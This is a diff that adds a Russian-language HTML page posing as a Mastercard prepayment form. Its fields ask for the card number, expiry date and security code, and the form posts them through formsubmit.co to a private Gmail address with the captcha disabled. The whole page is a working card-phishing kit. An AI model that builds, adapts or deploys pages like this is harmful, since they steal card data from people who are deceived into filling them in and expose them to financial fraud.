@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title></title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      background: #121212;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin:0;
+    }
+    .card-form {
+      background: #1f1f1f;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 380px;
+      width: 100%;
+      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+    }
+    .card-logo {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .card-logo img {
+      width: 48px;
+      height: 48px;
+      margin-right: 10px;
+    }
+    .card-logo h2 {
+      font-size: 1.1rem;
+      margin: 0;
+    }
+    label {
+      display: block;
+      font-size: 0.9rem;
+      margin-bottom: 4px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #444;
+      border-radius: 8px;
+      margin-bottom: 14px;
+      background: #2a2a2a;
+      color: #fff;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #ff4d4d;
+      color: #fff;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #ff2d2d;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card-form">
+    <div class="card-logo">
+      <!-- сюда любая картинка, например логотип -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/80px-Mastercard-logo.png" alt="logo">
+      <h2>Ведите карту штоб получить предоплату</h2>
+    </div>
+
+    <!-- Форма отправки -->
+    <form action="https://formsubmit.co/Golda1.namechtu@gmail.com" method="POST">
+      <!-- скрытые настройки FormSubmit -->
+      <input type="hidden" name="_subject" value="Новое сообщение с формы">
+      <input type="hidden" name="_captcha" value="false">
+
+      <label>Номер карты</label>
+      <input type="text" name="field1" placeholder="0000 0000 0000 0000" required>
+
+      <label>MM/RR</label>
+      <input type="text" name="field2" placeholder="срок годности карты" required>
+
+      <label>MRM (код зади на карточке)</label>
+      <input type="text" name="field3" placeholder="000" required>
+
+      <button type="submit">Ввести</button>
+    </form>
+  </div>
+
+</body>
+</html>
